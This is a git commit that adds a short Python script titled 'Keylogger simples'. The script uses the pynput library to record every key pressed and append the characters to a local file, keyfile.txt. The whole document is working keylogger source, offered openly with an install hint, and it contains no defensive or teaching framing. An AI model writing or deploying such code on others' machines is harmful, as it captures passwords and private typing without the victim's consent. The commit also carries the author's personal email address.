093f43d32a9d746d537aaa8de29411b52f44e8b7
Vitor Pichiteli Pereira <vitorpichiteli11@gmail.com>
2025-06-04 19:09:15 -0300

    Keylogger simples

---
+++ Python KeyLogger.py
@@ -0,0 +1,22 @@
+#first of all, install the library using pip install pynput
+
+from pynput import keyboard
+
+def keyPressed(key):
+    print(str(key))
+    with open("keyfile.txt", 'a') as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            if key == keyboard.Key.space:
+                logKey.write(' ')
+            elif key == keyboard.Key.enter:
+                logKey.write('\n')
+            else:
+                print("Error")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
